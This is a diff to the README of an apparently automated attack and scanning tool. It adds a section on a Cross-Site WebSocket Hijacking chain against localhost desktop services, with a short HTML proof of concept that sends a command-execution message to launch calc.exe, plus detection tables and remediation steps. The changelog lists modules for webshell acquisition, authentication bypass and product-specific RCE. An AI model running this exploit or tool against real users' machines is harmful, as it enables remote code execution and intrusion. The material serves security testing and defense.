@@ -440,6 +440,68 @@ INFERRED  = /mics/login.jsp exists, endpoint not yet tested
 
 ---
 
+### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
+
+> **Research basis:**  
+> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai)  
+> Similar prior art: Tavis Ormandy (Electrum WebSocket RCE, 2018)
+
+**Attack chain:**
+
+```
+① EXE download path extracted from JS → file accessible without auth
+② JS contains ws://127.0.0.1:PORT → desktop app runs local WebSocket server
+③ WebSocket has no Origin header validation → CSWSH (Cross-Site WebSocket Hijacking)
+④ WebSocket exposes RCE gadget: {RUN: "DRIVE", URL: "calc.exe"}
+    └── Service falls through to explorer.exe ShellExecute → OS-level code execution
+⑤ Zero-click: victim visits attacker page → instant RCE
+```
+
+**AI auto-trigger conditions** (bingo runs this scan automatically):
+
+| Condition | Detection method |
+|-----------|-----------------|
+| `ws://127.0.0.1:PORT` in JS files | JS static analysis |
+| EXE download function in JS (`downSetup`, `down=service`) | Regex pattern match |
+| `Content-Type: application/octet-stream` response | HTTP probe |
+| `download/setup/install` JS functions | Keyword scan |
+
+**Finding types and evidence levels:**
+
+| Finding | Evidence Level | Severity |
+|---------|---------------|----------|
+| `js_exe_download` | `LIKELY` | Medium |
+| `js_localhost_websocket` | `LIKELY` | High |
+| `cswsh_port_open` | `VERIFIED` (TCP connect) | Critical |
+| `exe_exposed` | `VERIFIED` (HTTP 200 + octet-stream) | High |
+| `cswsh_rce_chain` | `LIKELY`/`VERIFIED` | Critical |
+
+**Auto-generated PoC:**
+
+```html
+<!-- CSWSH PoC — victim opens this page → RCE triggers automatically -->
+<script>
+var ws = new WebSocket('ws://127.0.0.1:PORT');
+ws.onopen = function() {
+  ws.send(JSON.stringify({GET: 'VERSION'}));             // confirm service
+  ws.send(JSON.stringify({RUN: 'DRIVE', URL: 'calc.exe'})); // RCE gadget
+};
+</script>
+```
+
+> **Note (Zero-Hallucination):**  
+> Server-side scanners cannot connect to `ws://127.0.0.1` — JS pattern detection is `LIKELY`.  
+> TCP port open = `VERIFIED`. Browser-based PoC required for final confirmation.
+
+**Remediation (auto-included in report):**
+1. Implement Origin header validation in localhost WebSocket server — whitelist approach
+2. Remove file/process execution methods from WebSocket API (`RUN/DRIVE`, `RUN/APP`)
+3. Add authentication token requirement to WebSocket handshake
+4. Require authentication for EXE download endpoints (signed URLs or session check)
+5. Replace `explorer.exe` ShellExecute fallback with strict path whitelist
+
+---
+
 ### ACPV — Client-Side Authentication Bypass (v2.1)
 
 bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.
@@ -720,7 +782,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **45 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45)
+- **46 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
